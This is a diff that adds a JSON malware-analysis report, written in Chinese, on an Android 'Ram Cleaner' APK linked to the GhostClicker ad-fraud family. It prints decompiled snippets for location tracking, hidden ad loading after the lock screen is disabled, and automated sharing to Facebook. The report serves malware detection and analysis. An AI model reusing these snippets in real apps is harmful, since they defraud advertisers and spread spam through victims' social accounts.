@@ -1,0 +1,116 @@
+{
+  "APK信息": {
+    "文件名": "1e2c8d3fded5de45906e9cf72a06c86d2d6e74936ffe507eb5d8af2c2636d8ec.apk",
+    "sha256": "1e2c8d3fded5de45906e9cf72a06c86d2d6e74936ffe507eb5d8af2c2636d8ec",
+    "包名": "com.vnm1.ramcleaner",
+    "应用名": "Ram Cleaner",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 632.7
+  },
+  "行为列表": [
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\android\\gms\\location\\FusedLocationProviderApi;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "PendingResult requestLocationUpdates(GoogleApiClient googleApiClient, LocationRequest locationRequest, PendingIntent pendingIntent);",
+          "malicious_code_snippet_context": "  \n      PendingResult removeLocationUpdates(GoogleApiClient googleApiClient, LocationListener locationListener);\n  \n>>>     PendingResult requestLocationUpdates(GoogleApiClient googleApiClient, LocationRequest locationRequest, PendingIntent pendingIntent);\n  \n      PendingResult requestLocationUpdates(GoogleApiClient googleApiClient, LocationRequest locationRequest, LocationCallback locationCallback, Looper looper);\n  ",
+          "behavior_description": "该代码为 Google Play Services 的 FusedLocationProviderApi 位置服务接口定义，重点行通过 requestLocationUpdates 以 PendingIntent 方式注册位置更新监听，使应用无需保持前台运行即可在后台持续接收设备位置数据（配合 getLastLocation 还可读取最近一次位置）。数据流向：设备 GPS/网络定位信息（source）→ 通过 PendingIntent 注册的后台持续位置收集（sink）。在已确认的 GhostClicker 恶意广告样本中，此类后台位置请求属于对用户位置隐私的过度收集，位置数据可能被用于精准广告投放或回传远程服务器，但该片段本身仅为库接口定义，未展示数据外传的具体证据，故判定为灰色行为、中等风险。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ad_fraud",
+      "中文名": "广告欺诈",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "hidden_ad",
+          "中文名": "隐藏广告",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "Interstitial",
+              "loadAd",
+              "showAd",
+              "Banner"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\bth\\studio\\ActivityService;",
+          "method_signature": "if(BroadcastProcess.d)",
+          "malicious_behavior": "ad_fraud",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "this.a.disableKeyguard();\nAdView adView = new AdView(this);\nadView.setAdSize(AdSize.SMART_BANNER);\nadView.setAdUnitId(str);\nadView.loadAd(new AdRequest.Builder().addTestDevice(AdRequest.DEVICE_ID_EMULATOR).build());\nadView.setAdListener(new a(this));\nnew Thread(new c(this)).start();",
+          "malicious_code_snippet_context": "              wakeLockNewWakeLock.acquire();\n              wakeLockNewWakeLock.release();\n              this.a = ((KeyguardManager) getSystemService(\"keyguard\")).newKeyguardLock(\"IN\");\n>>>             this.a.disableKeyguard();\n>>>             this.c = true;\n>>>         }\n>>>         LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-1, -2);\n>>>         LinearLayout linearLayout = new LinearLayout(this);\n>>>         AdView adView = new AdView(this);\n>>>         adView.setAdSize(AdSize.SMART_BANNER);\n          adView.setAdUnitId(str);\n          linearLayout.addView(adView, layoutParams);\n          setContentView(linearLayout);",
+          "behavior_description": "该代码运行于后台 Service（ActivityService）中：先调用 disableKeyguard() 解除锁屏保护，随后动态创建 AdMob 的 AdView（SMART_BANNER），设置广告单元 ID 并通过 adView.loadAd() 加载广告。由于广告视图是在 Service 上下文中加载而非用户可见的 Activity 界面，广告在用户无感知的情况下完成加载与展示计数，构成隐藏广告欺诈；配合广告监听器（类a）和后台线程（类c），可进一步实现广告的自动点击/交互（与厂商报告 GhostClicker 点击欺诈家族行为吻合）。addTestDevice(DEVICE_ID_EMULATOR) 用于规避广告联盟在模拟器测试时的反作弊检测。数据流向：AdRequest.Builder() 构建广告请求（AdMob SDK 隐式采集设备标识等信息）→ adView.loadAd() 在隐藏的后台视图中加载广告，产生欺诈性广告展示与收益。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "social_spread",
+      "中文名": "社交蠕虫传播",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "android.intent.action.SEND",
+          "com.facebook.katana"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\bth\\studio\\BroadcastProcess;",
+          "method_signature": "a(Context context, String str)",
+          "malicious_behavior": "social_spread",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.SEND\");\nintent.setType(\"text/plain\");\nintent.putExtra(\"android.intent.extra.TEXT\", str);\nfor (ResolveInfo resolveInfo : context.getPackageManager().queryIntentActivities(intent, 0)) {\n    if (resolveInfo.activityInfo.packageName.equals(\"com.facebook.katana\")) {\n        intent.setPackage(resolveInfo.activityInfo.packageName);\n        context.startActivity(intent);\n        return;\n    }\n}",
+          "malicious_code_snippet_context": "      }\n  \n      private final void a(Context context, String str) {\n>>>         Intent intent = new Intent(\"android.intent.action.SEND\");\n>>>         intent.setType(\"text/plain\");\n>>>         intent.putExtra(\"android.intent.extra.TEXT\", str);\n>>>         intent.setFlags(DriveFile.MODE_READ_ONLY);\n>>>         List<ResolveInfo> listQueryIntentActivities = context.getPackageManager().queryIntentActivities(intent, 0);\n>>>         for (ResolveInfo resolveInfo : listQueryIntentActivities) {\n>>>             if (resolveInfo.activityInfo.packageName.equals(\"com.facebook.katana\")) {\n>>>                 intent.setPackage(resolveInfo.activityInfo.packageName);\n>>>                 context.startActivity(intent);\n>>>                 return;\n              }\n          }\n          for (ResolveInfo resolveInfo2 : listQueryIntentActivities) {",
+          "behavior_description": "该方法在后台广播组件 BroadcastProcess 中（外层由 AlarmManager.setRepeating 周期性触发）构造 ACTION_SEND 分享意图，将外部传入的文本 str 填入 EXTRA_TEXT，遍历系统中可处理分享的应用并专门匹配 Facebook 官方应用（com.facebook.katana），随后以 NEW_TASK 方式定向调起 Facebook 分享界面，将消息推送至用户的 Facebook 社交圈。结合该样本属于 GhostClicker 自动点击恶意软件家族（具备自动点击能力），可实现定时、自动化地通过受害者社交账号传播含恶意推广/下载链接的内容，构成社交蠕虫式传播。数据流向：恶意构造的传播文本 str（方法参数）→ Intent ACTION_SEND 的 EXTRA_TEXT → 定向调起 com.facebook.katana 完成社交分享发布。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
